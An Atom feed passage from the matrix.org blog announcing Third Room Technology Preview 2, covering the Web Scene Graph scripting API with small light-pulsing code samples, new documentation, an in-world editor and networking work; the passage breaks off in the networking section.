<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title> - General</title>
    <link href="https://matrix.org/category/general/atom.xml" rel="self" type="application/atom+xml"/>
    <link href="https://matrix.org"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2023-06-07T15:15:43+00:00</updated>
    <id>https://matrix.org/category/general/atom.xml</id>
    <entry xml:lang="en">
        <title>Introducing Third Room TP2: The Creator Update</title>
        <published>2023-06-07T15:15:43+00:00</published>
        <updated>2023-06-07T15:15:43+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2023/06/07/introducing-third-room-tp2-the-creator-update/" type="text/html"/>
        <id>https://matrix.org/blog/2023/06/07/introducing-third-room-tp2-the-creator-update/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Back in September 2022 we launched the very &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;09&#x2F;27&#x2F;announcing-third-room-tech-preview-1&quot;&gt;first public technology preview&lt;&#x2F;a&gt; of &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&quot;&gt;Third Room&lt;&#x2F;a&gt; - our entirely open source, open standards-based platform for creating decentralised multiparty spatial apps and virtual worlds on top of Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;The mission of Third Room is to ensure that a truly open and equitable platform exists for powering shared 3D environments - providing an alternative to the closed walled gardens of the bigger vendors, and generally safeguard against a repeat of the fragmented dystopia that has plagued instant messaging and VoIP systems.  In short, just as Matrix aims to be the missing secure communication layer of the open Web, Third Room aims to be the spatial collaboration layer.&lt;&#x2F;p&gt;
&lt;p&gt;Today, we’re incredibly excited to announce &lt;strong&gt;Third Room Technology Preview 2: The Creator Update&lt;&#x2F;strong&gt;.  As more and more 3D hardware enters the market, the race is on to provide tools to developers and creators so they can build on an open, vendor-agnostic platform - and in this update we’ve focused on building out the &lt;strong&gt;scripting&lt;&#x2F;strong&gt;, &lt;strong&gt;editing&lt;&#x2F;strong&gt; and &lt;strong&gt;authoring&lt;&#x2F;strong&gt; capabilities of Third Room to provide a solid platform for building and running collaborative 3D apps of any kind. Check out the new release at &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&quot;&gt;https:&#x2F;&#x2F;thirdroom.io&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
As a reminder: the Third Room team is a tiny band formed by Robert, Nate and Ajay and operates outside of all the rest of our work on Matrix: the other 97% of our effort goes into making the core of Matrix amazing (particularly the underpinnings for Element X and the next generation of Matrix clients). However, Matrix is about more than just chat and VoIP, and Third Room provides an excellent showcase of Matrix’s abilities as a general purpose communication fabric.
&lt;&#x2F;blockquote&gt;
&lt;h3 id=&quot;introducing-web-scene-graph&quot;&gt;Introducing Web Scene Graph&lt;&#x2F;h3&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;&quot;&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2023-06-07-websg.jpg&quot; width=&quot;480&quot; alt=&quot;WebSG&quot;&#x2F;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;At the heart of Third Room TP2 is &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;&quot;&gt;Web Scene Graph (WebSG)&lt;&#x2F;a&gt; - our new API to let developers create their own spatial multiparty apps and experiences in Third Room. WebSG does to glTF what JavaScript and the DOM did to HTML - it makes it come alive. With WebSG, we’re building the first implementation of an open standard for interoperable programming of virtual worlds, with the hope of submitting it to the W3C as a general purpose building block of the Web.&lt;&#x2F;p&gt;
&lt;p&gt;All content in Third Room is described using the &lt;a href=&quot;https:&#x2F;&#x2F;www.khronos.org&#x2F;gltf&#x2F;&quot;&gt;glTF 2.0&lt;&#x2F;a&gt; open standard, and so to let developers write their own functionality within Third Room we needed to provide an API that lets you dive into the glTF and manipulate it - much as the DOM API lets web developers edit the HTML DOM.  For whatever reason, an open standard API doesn’t exist for manipulating glTF… so we created Web Scene Graph (WebSG) to fill the void. Just like the DOM, it provides an incredibly powerful generic toolkit for manipulating 3D assets irrespective of the engine being used to render them.&lt;&#x2F;p&gt;
&lt;p&gt;WebSG isn’t just for manipulating scene graphs though - it also provides a whole in-world UI framework for creating 3D user interfaces in glTF; it provides an Action Bar API to let apps modify the controls available in Third Room’s overlay UI; you also get the Collision Listener API to get callbacks from the physics engine; ECS API to interact directly with the Entity Component System that tracks the world state; and Networking APIs to send and receive messages directly between clients via Matrix-negotiated WebRTC DataChannels.&lt;&#x2F;p&gt;
&lt;p&gt;As a quick taster - a WebSG app to pulse a light in your scene can be as simple as this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span&gt;world.onload = () &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;directionalLight = world.findLightByName(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;DirectionalLight&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;); 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    world.onupdate = (dt, time) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        directionalLight.color[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] = (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;Math&lt;&#x2F;span&gt;&lt;span&gt;.sin(time) + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    };
&lt;&#x2F;span&gt;&lt;span&gt;};
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Third Room takes the JS and compiles it down to WASM using &lt;a href=&quot;https:&#x2F;&#x2F;bellard.org&#x2F;quickjs&#x2F;&quot;&gt;QuickJS&lt;&#x2F;a&gt;, and then executes it within a WASM sandbox - isolating it entirely from your other conversations and the rest of the Third Room. (In future, we’ll look to provide quota limits to ensure scripts don’t get greedy with resources).&lt;&#x2F;p&gt;
&lt;p&gt;We also support a low-level C API for WebSG, letting you compile your own native code down to WASM - in C the same script looks like this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#9b9b9b;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;lt;math.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#9b9b9b;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;websg.h&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Light &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;directionalLight;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;export &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span&gt;websg_load() {
&lt;&#x2F;span&gt;&lt;span&gt;    directionalLight =
&lt;&#x2F;span&gt;&lt;span&gt;        websg_world_find_light_by_name(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;DirectionalLight&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;export &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span&gt;websg_update(float_t dt, float_t time) {
&lt;&#x2F;span&gt;&lt;span&gt;    websg_light_set_color_element(
&lt;&#x2F;span&gt;&lt;span&gt;        directionalLight, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, (sin(time) + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;) &#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;2.0
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;But don’t worry - we’re not expecting folks to be writing C as a matter of course; the reason to provide the low-level C API is so that in future we can easily provide Rust and Zig (or more!) bindings so folks can use their favourite native language to compile optimised WASM rather than using interpreted JavaScript.  That said, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;blob&#x2F;main&#x2F;examples&#x2F;procgen&#x2F;c&#x2F;src&#x2F;procgen.c&quot;&gt;procgen&lt;&#x2F;a&gt; is a fun C example of a procedurally generated Perlin noise blob which pulsates in response to local audio, as an idea of what you can do today if you’re willing to write some C!  There’s also a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;blob&#x2F;main&#x2F;examples&#x2F;procgen&#x2F;js&quot;&gt;JS version&lt;&#x2F;a&gt; of it too.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve also bundled basic Matrix widget API support alongside WebSG, so WASM scripts in Third Room can send and receive Matrix events in the underlying chatroom (as well as directly sending messages between clients over WebRTC datachannels).  For instance, one of the commercial WebSG apps which Element has written on top of Third Room is a real-time air traffic simulator, which consumes location-share beacons from the underlying Matrix room (bridged from ADS-B data sources) and procedurally renders them in 3D or AR over a map of the region in question:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2023-06-07-sfo.jpg&quot; alt=&quot;SFO&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We’ve also added a native orbit viewer into Third Room, so from WebSG you can simply call &lt;code&gt;node.startOrbit()&lt;&#x2F;code&gt; on any node to temporarily switch into focusing on a given object (WASD to move; mousewheel to zoom; escape to exit).&lt;&#x2F;p&gt;
&lt;p&gt;Finally, to really show off WebSG at its best, we’ve gone and written a simple game of basketball in precisely &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;blob&#x2F;main&#x2F;examples&#x2F;basketball&#x2F;js&#x2F;basketball.js&quot;&gt;100 lines of code&lt;&#x2F;a&gt;, and published a step-by-step tutorial (&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;basketball&#x2F;part-1.html&quot;&gt;Part 1&lt;&#x2F;a&gt; covering Interactables, &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;basketball&#x2F;part-2.html&quot;&gt;Part 2&lt;&#x2F;a&gt; covering Collisions and &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;basketball&#x2F;part-3.html&quot;&gt;Part 3&lt;&#x2F;a&gt; covering Networking) so you can follow along at home.&lt;&#x2F;p&gt;
&lt;iframe width=&quot;1280&quot; height=&quot;720&quot; src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;VimOoGCPWWw&quot; title=&quot;Third Room Basketball Tutorial End Result&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;Or if you’re impatient you can jump ahead and play with the game &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;world&#x2F;#basketball-court:thirdroom.io&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;WebSG has gone through quite a few major iterations since announcing it at &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=nG8qJ4on00Y&quot;&gt;FOSDEM&lt;&#x2F;a&gt;, but we’re feeling happy with the current result and have formalised this initial public release with formal API docs as well as the various tutorials.  That said, we’d love to hear feedback via &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#thirdroom-dev:matrix.org&quot;&gt;#thirdroom-dev:matrix.org&lt;&#x2F;a&gt; - so please let us know if you’re missing anything or if there are any rough edges we haven’t spotted!&lt;&#x2F;p&gt;
&lt;p&gt;For more details on WebSG, see:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;the &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;&quot;&gt;API overview&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;the &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;basketball&#x2F;part-1.html&quot;&gt;Tutorial&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;the &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;websg-js&#x2F;&quot;&gt;API reference docs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;…or the all various &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;blob&#x2F;main&#x2F;examples&quot;&gt;examples&lt;&#x2F;a&gt; in the Third Room repository:
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;basketball&#x2F;js&quot;&gt;basketball&#x2F;js&lt;&#x2F;a&gt; - the basketball game tutorial&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;ecs-basic&#x2F;js&quot;&gt;ecs-basic&#x2F;js&lt;&#x2F;a&gt; - an ECS example which spins a given object&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;interactable&quot;&gt;interactable&lt;&#x2F;a&gt; - an example for switching lights on and off&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;matrix&quot;&gt;matrix&lt;&#x2F;a&gt; - turns the whole world into triplanar Matrix textures via an easter egg&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;network&#x2F;c&quot;&gt;network&#x2F;c&lt;&#x2F;a&gt; - synchronise light state via raw network messages&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;physics&#x2F;js&quot;&gt;physics&#x2F;js&lt;&#x2F;a&gt; - create boxes and bump them around&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;platformer&#x2F;js&quot;&gt;platformer&#x2F;js&lt;&#x2F;a&gt; - the beginnings of a 3D platformer game (needs better character controller)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;presentation&#x2F;js&quot;&gt;presentation&#x2F;js&lt;&#x2F;a&gt; - script for previous&#x2F;next buttons for swapping slides in a presentation&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;procgen&quot;&gt;procgen&lt;&#x2F;a&gt; - renders an animated blob of Perlin noise whose geometry reacts to local audio&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;ui-basic&#x2F;js&quot;&gt;ui-basic&#x2F;js&lt;&#x2F;a&gt; - renders text for in-world UI via the &lt;a href=&quot;https:&#x2F;&#x2F;yogalayout.com&#x2F;&quot;&gt;Yoga&lt;&#x2F;a&gt; CSS flexbox engine&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;ui&#x2F;js&quot;&gt;ui&#x2F;js&lt;&#x2F;a&gt; - renders nested text using Yoga&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;websg-v1&quot;&gt;websg-v1&lt;&#x2F;a&gt; - moves and spins some platforms&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;widget-echo&#x2F;js&quot;&gt;widget-echo&#x2F;js&lt;&#x2F;a&gt; - echos any Matrix message that starts &lt;code&gt;&#x2F;echo&lt;&#x2F;code&gt; back into the room&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;examples&#x2F;widget-hello-world&#x2F;c&quot;&gt;widget-hello-world&#x2F;c&lt;&#x2F;a&gt; - sends “hello world” into the Matrix room.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;introducing-the-third-room-documentation-site&quot;&gt;Introducing the Third Room Documentation site&lt;&#x2F;h3&gt;
&lt;p&gt;Talking of docs, we’re proud to unveil a shiny new documentation website for Third Room at &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&quot;&gt;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&lt;&#x2F;a&gt;. This is the official resource for developers wishing to build on top of Third Room - currently covering:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;&quot;&gt;Getting Started&lt;&#x2F;a&gt; - a basic guide for users first coming to Third Room&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;creators.html&quot;&gt;The Creator Guide&lt;&#x2F;a&gt; - explaining how 3D artists and developers can rapidly get up and running by exporting existing assets into glTF for Third Room.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;unity&#x2F;&quot;&gt;The Unity Exporter Guide&lt;&#x2F;a&gt; - explaining how to use export existing Unity assets to glTF for use in Third Room&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;developers.html&quot;&gt;The Developer Guide&lt;&#x2F;a&gt; - an overview of developing applications using the Web Scene Graph API and self-hosting your own Third Room instance&lt;&#x2F;li&gt;
&lt;li&gt;Web Scene Graph (WebSG)
&lt;ul&gt;
&lt;li&gt;An &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;&quot;&gt;overview&lt;&#x2F;a&gt; of the WebSG API and its JS and C bindings&lt;&#x2F;li&gt;
&lt;li&gt;The official WebSG Tutorial - learn how to build a basketball game with WebSG!
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;basketball&#x2F;part-1.html&quot;&gt;Part 1: Interactables&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;basketball&#x2F;part-2.html&quot;&gt;Part 2: Collisions and UI&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;basketball&#x2F;part-3.html&quot;&gt;Part 3: Networking &lt;&#x2F;a&gt;(in progress)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;scenegraph.html&quot;&gt;A guide to the Scene Graph itself&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;meshes.html&quot;&gt;A guide to manipulating meshes&lt;&#x2F;a&gt; with WebSG&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;materials.html&quot;&gt;A guide to materials&lt;&#x2F;a&gt; with WebSG&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;lighting.html&quot;&gt;A guide to lighting&lt;&#x2F;a&gt; with WebSG&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;physics.html&quot;&gt;A guide to physics&lt;&#x2F;a&gt; with WebSG&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;ecs.html&quot;&gt;A guide to the ECS API&lt;&#x2F;a&gt; with WebSG&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;actionbar.html&quot;&gt;A guide to the Action Bar API&lt;&#x2F;a&gt; with WebSG&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;ui.html&quot;&gt;A guide to the in-world UI API&lt;&#x2F;a&gt; with WebSG&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;interactables.html&quot;&gt;A guide to interactables&lt;&#x2F;a&gt; with WebSG&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;guides&#x2F;websg&#x2F;networking.html&quot;&gt;A guide to low-latency networking&lt;&#x2F;a&gt; over MatrixRTC via WebSG&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Reference documentation:
&lt;ul&gt;
&lt;li&gt;The official &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;websg-js&#x2F;&quot;&gt;WebSG API&lt;&#x2F;a&gt; reference documentation&lt;&#x2F;li&gt;
&lt;li&gt;The official reference for the various &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;docs&#x2F;gltf&#x2F;&quot;&gt;glTF Extensions&lt;&#x2F;a&gt; used by Third Room (in progress).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2023-06-07-docs.png&quot; alt=&quot;Docs&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;introducing-the-in-world-editor&quot;&gt;Introducing the In-World Editor&lt;&#x2F;h3&gt;
&lt;p&gt;Aside from all the WebSG API excitement, another key area in this release is the ability to visualise and manipulate the glTF scene graph in real-time via the in-world editor.  At any time while using Third Room, you can now hit the backtick key ``` and bring up an overlay showing the current scene graph of the world - and go clicking through the nodes to inspect their current state, and experiment with editing them a bit.  Currently this requires you to be an admin in the room.  For instance, you can go in and mess around with the scene’s materials via the Resources tab of the scene graph panel and the Inspector panel on the right hand side:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2023-06-07-editor-1.png&quot; alt=&quot;Editor 1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;…or you could go and move the geometry outright:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2023-06-07-editor-2.png&quot; alt=&quot;Editor 2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;…or even bring up a &lt;a href=&quot;https:&#x2F;&#x2F;microsoft.github.io&#x2F;monaco-editor&#x2F;&quot;&gt;Monaco&lt;&#x2F;a&gt; editor to directly edit the script controlling the world (if it’s JavaScript):&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2023-06-07-editor-3.png&quot; alt=&quot;Editor 3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;…and hit Save &amp;amp; Run and see your changes instantly take effect:&lt;&#x2F;p&gt;
&lt;iframe width=&quot;1280&quot; height=&quot;751&quot; src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;TWC6MpUh6KY&quot; title=&quot;Third Room WebSG demo&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;If it wasn’t obvious, this is Third Room’s equivalent of your browser’s developer tools: letting you jump straight into the scene and see precisely what’s going on, and directly manipulate it in real-time.&lt;&#x2F;p&gt;
&lt;p&gt;Now, there’s a bit remaining on this: the inspector needs to expose more UI for manipulating the scene (e.g. gizmos for picking objects in-world and translating&#x2F;rotating them, etc); we need better error feedback in the inspector (or even a debugger); we can’t yet create&#x2F;copy&#x2F;delete nodes in the scenegraph, etc.  However, it’s already super-useful for seeing what’s going on and helping debug your WebSG scripts.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;networking&quot;&gt;Networking&lt;&#x2F;h3&gt;
&lt;p&gt;Another area which has seen a lot of work in this update is Third Room’s networking - i.e. how you synchronise world state between clients as efficiently and rapidly as possible, and (critically) how you make that work deterministically now that we have WebSG.&lt;&#x2F;p&gt;
&lt;p&gt;At the lower levels, all the networking in Third Room operates over WebRTC data channels negotiated via Matrix (aka MatrixRTC), which establish a full mesh between all the peers active in the room. (In future this will be scaled up using &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2023&#x2F;schedule&#x2F;event&#x2F;cascaded_selective_forwarding_units&#x2F;&quot;&gt;Selective Forwarding Units&lt;&#x2F;a&gt;, but this work is still in progress).&lt;&#x2F;p&gt;
